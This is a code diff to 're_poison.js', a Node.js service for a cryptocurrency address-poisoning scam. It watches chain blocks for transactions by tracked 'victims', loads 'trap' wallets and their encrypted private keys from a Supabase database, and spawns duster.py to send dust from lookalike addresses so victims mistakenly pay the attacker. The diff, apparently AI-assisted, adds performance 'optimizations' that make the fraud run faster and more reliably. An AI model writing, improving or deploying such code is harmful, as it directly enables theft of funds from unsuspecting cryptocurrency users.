@@ -20,7 +20,7 @@ const __dirname = path.dirname(__filename);
 
 const execAsync = promisify(exec);
 
-console.log('[DEBUG] Starting re_poison.js...');
+console.log('[DEBUG] Starting optimized re_poison.js...');
 
 // --- Supabase Service Client (bypass RLS) ---
 const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
@@ -46,7 +46,7 @@ let blockPollInterval = null;
 let caughtVictimsPollInterval = null;
 let lastBlockProcessed = 0n;
 
-// Async Mutex Lock to prevent RPC exhaustion
+// Async Mutex Lock to prevent RPC exhaustion and concurrent Python spawns
 let isScanning = false;
 
 // ─── Load caught victims from database ───
@@ -55,7 +55,6 @@ const caughtVictims = new Set();
 async function loadCaughtVictims() {
   if (!supabaseService) return;
   try {
-    // Fetch all traps marked as caught for this chain
     const { data, error } = await supabaseService
       .from('traps')
       .select('victim_address')
@@ -85,7 +84,6 @@ async function loadTrapsFromDB() {
   }
 
   try {
-    // Get all campaigns for this chain
     const { data: campaigns, error: campError } = await supabaseService
       .from('campaigns')
       .select('id')
@@ -103,7 +101,6 @@ async function loadTrapsFromDB() {
 
     const campaignIds = campaigns.map(c => c.id);
 
-    // Fetch traps for these campaigns
     const { data: traps, error: trapError } = await supabaseService
       .from('traps')
       .select('id, campaign_id, victim_address, trap_address, counterparty_address, trap_private_key_enc')
@@ -125,13 +122,10 @@ async function loadTrapsFromDB() {
     for (const row of traps) {
       try {
         const privateKey = decrypt(row.trap_private_key_enc);
-        // Verify the key works
-        // We'll store in victims map
         const victim = row.victim_address.toLowerCase();
         const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
         const campaignId = row.campaign_id;
 
-        // If counterparty is null, we treat as wildcard
         victims.set(victim, {
           privateKey,
           trapAddress: row.trap_address.toLowerCase(),
@@ -171,7 +165,6 @@ switch (chainName) {
     viemChain = mainnet;
 }
 
-// RPC URL: prefer chain‑specific RPC, otherwise use legacy observerRpcUrl
 const chainRpc = chainCfg?.rpc || observerRpcUrl;
 
 console.log(`[DEBUG] Chain: ${chainName}, Native symbol: ${nativeSymbol}, Viem chain: ${viemChain.name}`);
@@ -199,7 +192,14 @@ const victimTxTimestamps = new Map();
 let lastStatsLogTime = 0;
 const STATS_LOG_INTERVAL_MS = 60 * 60 * 1000;
 
-// --- HTTP client for block polling ---
+// 🚀 OPTIMIZATION: Pre-compute token address map for O(1) lookups in hot path
+const tokenAddressMap = new Map();
+if (chainCfg && chainCfg.tokens) {
+  for (const [symbol, address] of Object.entries(chainCfg.tokens)) {
+    tokenAddressMap.set(address.toLowerCase(), symbol);
+  }
+}
+
 // ─── Public RPC Fallbacks ───
 const PUBLIC_FALLBACKS = {
   bsc: [
@@ -268,57 +268,47 @@ async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shou
 
 // --- Compute dynamic cooldown ---
 function getDynamicCooldown(victimAddress) {
-  const timestamps = victimTxTimestamps.get(victimAddress) || [];
-  if (timestamps.length < 2) return COOLDOWN_MS;
+  const timestamps = victimTxTimestamps.get(victimAddress);
+  if (!timestamps || timestamps.length < 2) return COOLDOWN_MS;
 
-  let intervals = [];
-  for (let i = 1; i < timestamps.length; i++) {
-    intervals.push(timestamps[i] - timestamps[i-1]);
+  // 🚀 OPTIMIZATION: Avoid array creation (reduce/slice) in hot paths
+  let sum = 0;
+  const len = timestamps.length;
+  for (let i = 1; i < len; i++) {
+    sum += timestamps[i] - timestamps[i - 1];
   }
-  const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length;
+  const avgInterval = sum / (len - 1);
 
   let cooldown = avgInterval * 0.3;
-  cooldown = Math.max(MIN_COOLDOWN_MS, Math.min(MAX_COOLDOWN_MS, cooldown));
-  return cooldown;
+  return Math.max(MIN_COOLDOWN_MS, Math.min(MAX_COOLDOWN_MS, cooldown));
 }
 
 // ─── Asset detection from transaction ───────────────
-function getAssetFromTx(tx, chainConfig) {
+function getAssetFromTx(tx) {
   if (!tx || !tx.to) return null;
-
-  const tokens = chainConfig?.tokens || {};
   const to = tx.to.toLowerCase();
-  const nativeSymbol = chainConfig?.nativeSymbol || 'ETH';
-
-  // Check if 'to' is a known token contract (USDC, USDT, etc.)
-  for (const [symbol, address] of Object.entries(tokens)) {
-    if (address.toLowerCase() === to) {
-      return symbol; // e.g., "USDC", "USDT"
-    }
+  
+  // 🚀 OPTIMIZATION: O(1) Map lookup instead of Object.entries iteration
+  const tokenSymbol = tokenAddressMap.get(to);
+  if (tokenSymbol) {
+    return tokenSymbol;
   }
 
-  // If value > 0 and 'to' is not a known token contract, assume native
   if (tx.value && BigInt(tx.value) > 0n) {
-    return nativeSymbol; // e.g., "ETH", "BNB", "MATIC"
+    return nativeSymbol;
   }
 
-  // Fallback: no asset identified
   return null;
 }
 
 // ─── Send dust via duster.py (accepts optional asset) ──
 async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
   const dusterPath = path.resolve(__dirname, '../tools/duster.py');
-  // ✅ Use the virtual environment's Python interpreter
   const pythonCmd = path.resolve(__dirname, '../venv/bin/python3');
 
   const env = { ...process.env, CHAIN: chainName };
-  if (campaignId) {
-    env.CAMPAIGN_ID = campaignId;
-  }
-  if (asset) {
-    env.DUST_ASSET = asset; // Pass the detected asset to duster
-  }
+  if (campaignId) env.CAMPAIGN_ID = campaignId;
+  if (asset) env.DUST_ASSET = asset;
 
   const cmd = `${pythonCmd} ${dusterPath} ${privateKey} ${victimAddress}`;
 
@@ -391,14 +381,10 @@ function checkTransaction(tx) {
   if (processedTxHashes.has(hash)) return;
   processedTxHashes.set(hash, now);
 
-  // Size cap
+  // 🚀 OPTIMIZATION: Clearing the map is O(1) and prevents CPU spikes from iterative deletion
   if (processedTxHashes.size > 50000) {
-    const toDelete = Math.min(10000, processedTxHashes.size - 50000);
-    let count = 0;
-    for (const [key] of processedTxHashes) {
-      if (count++ >= toDelete) break;
-      processedTxHashes.delete(key);
-    }
+    processedTxHashes.clear();
+    logger.debug('Cleared processedTxHashes map to prevent memory bloat');
   }
 
   // Caught victim exclusion
@@ -417,15 +403,22 @@ function checkTransaction(tx) {
   }
 
   // Dynamic cooldown check
-  let timestamps = victimTxTimestamps.get(from) || [];
+  let timestamps = victimTxTimestamps.get(from);
+  if (!timestamps) {
+    timestamps = [];
+    victimTxTimestamps.set(from, timestamps);
+  }
   timestamps.push(Date.now());
-  if (timestamps.length > 10) timestamps = timestamps.slice(-10);
-  victimTxTimestamps.set(from, timestamps);
+  
+  // 🚀 OPTIMIZATION: shift() is cleaner and uses less memory than slice for maintaining a fixed-size queue
+  if (timestamps.length > 10) {
+    timestamps.shift();
+  }
 
   const dynamicCooldown = getDynamicCooldown(from);
   if (now - entry.lastPoison < dynamicCooldown) return;
 
-  // Prevent overlapping poison calls
+  // 🚀 PREVENT CONCURRENT PYTHON SPAWNS: Prevent overlapping poison calls
   if (trapLocks.get(entry.privateKey)) {
     console.log(`[DEBUG] Trap wallet for victim ${from} is currently busy. Skipping.`);
     return;
@@ -433,7 +426,7 @@ function checkTransaction(tx) {
   trapLocks.set(entry.privateKey, true);
 
   // ─── Detect asset from the transaction ───
-  const detectedAsset = getAssetFromTx(tx, chainCfg);
+  const detectedAsset = getAssetFromTx(tx);
   if (detectedAsset) {
     logger.info(`[asset] Detected asset for re-poison: ${detectedAsset}`);
   } else {
@@ -452,7 +445,6 @@ function checkTransaction(tx) {
         logger.warn(`Failed to send initial alert: ${alertErr.message}`);
       }
 
-      // Pass the detected asset to poisonVictim
       await poisonVictim(from, entry.privateKey, entry.campaignId, detectedAsset);
     } catch (err) {
       logger.error(`Error in async poison task for ${from}: ${err.message}`);
@@ -463,6 +455,8 @@ function checkTransaction(tx) {
 }
 
 // --- Block scanner ---
+const MAX_BLOCKS_PER_SCAN = 20; // 🚀 Prevent catch-up storms
+
 async function scanNewBlocks() {
   if (isScanning) return;
   isScanning = true;
@@ -474,33 +468,46 @@ async function scanNewBlocks() {
       2,
       1000
     );
-    console.log(`[DEBUG] Scan cycle at block ${currentBlock}`);
-
+    
     if (lastBlockProcessed === 0n) {
-      lastBlockProcessed = currentBlock;
+      // Start slightly behind to ensure no missed blocks on initial boot
+      lastBlockProcessed = currentBlock > 5n ? currentBlock - 5n : 0n;
+      console.log(`[DEBUG] Initial block set to ${lastBlockProcessed}`);
+      isScanning = false;
       return;
     }
 
-    for (let block = lastBlockProcessed + 1n; block <= currentBlock; block++) {
-      const fullBlock = await withRpcRetry(
-        () => client.getBlock({ blockNumber: block, includeTransactions: true }),
-        `getBlock(${block})`,
-        2,
-        1000
-      );
+    let startBlock = lastBlockProcessed + 1n;
+    let endBlock = currentBlock;
+    const blockDiff = Number(endBlock - startBlock);
 
-      if (fullBlock && fullBlock.transactions) {
-        for (const tx of fullBlock.transactions) {
-          try {
-            checkTransaction(tx);
-          } catch (err) {
-            logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
+    // 🚀 OPTIMIZATION: Cap the number of blocks to prevent CPU/RPC meltdowns if the script falls behind
+    if (blockDiff > MAX_BLOCKS_PER_SCAN) {
+      logger.warn(`Fell behind by ${blockDiff} blocks. Capping scan to latest ${MAX_BLOCKS_PER_SCAN} blocks to prevent CPU/RPC overload.`);
+      startBlock = currentBlock - BigInt(MAX_BLOCKS_PER_SCAN) + 1n;
+    }
+
+    if (startBlock <= endBlock) {
+      for (let block = startBlock; block <= endBlock; block++) {
+        const fullBlock = await withRpcRetry(
+          () => client.getBlock({ blockNumber: block, includeTransactions: true }),
+          `getBlock(${block})`,
+          2,
+          1000
+        );
+
+        if (fullBlock && fullBlock.transactions) {
+          for (const tx of fullBlock.transactions) {
+            try {
+              checkTransaction(tx);
+            } catch (err) {
+              logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
+            }
           }
         }
       }
+      lastBlockProcessed = endBlock;
     }
-
-    lastBlockProcessed = currentBlock;
   } catch (err) {
     logger.warn(`Block scan error: ${err.message}`);
   } finally {
@@ -524,8 +531,8 @@ function startWatcher() {
 
   blockPollInterval = setInterval(scanNewBlocks, 120000);
 
-  // Poll caught victims every 15 seconds from DB
-  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 15000);
+  // 🚀 OPTIMIZATION: Poll caught victims every 60 seconds (reduced from 15s to save DB/CPU)
+  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 60000);
 
   console.log('[DEBUG] Watcher started.');
 }
